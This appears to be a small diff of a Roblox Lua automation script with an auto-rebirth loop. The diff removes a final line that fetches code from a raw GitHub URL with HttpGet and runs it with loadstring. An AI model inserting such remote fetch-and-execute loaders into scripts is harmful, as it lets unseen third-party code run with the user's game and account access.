@@ -332,4 +332,3 @@ spawn(function()
         if _G.autoRebirthEnabled then pcall(autoRebirth) end
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KrogHub/Script/refs/heads/main/Analys",true))()
